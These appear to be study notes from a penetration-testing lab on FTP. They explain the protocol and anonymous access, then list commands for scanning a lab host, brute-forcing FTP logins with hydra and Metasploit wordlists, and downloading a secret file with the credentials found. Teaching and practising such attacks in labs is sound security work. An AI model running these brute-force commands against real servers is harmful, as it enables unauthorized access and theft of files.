- FTP (File Transfer Protocol) is a a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
- It is also frequently used as a means of transferring files to and from the directory of a web server.
- FTP authentication requires a username and password combination. As a result, we can perform a brute-force attack on the FTP server in order to identify legitimate credentials.
- In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access the FTP server without providing any legitimate credentials.

Practical Demonstration
- `nmap -sV demo.ine.local`
- `ftp demo.ine.local`
	- `exit`
- `ls -al /usr/share/nmap/scripts/ | grep ftp-*`
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp`
- Logging in using the credentials found via the brute-force attack.
	- `ftp demo.ine.local`
		- `dir`
		- `get secret.txt`
		- `exit`
	- `ls`
	- `cat secret.txt`
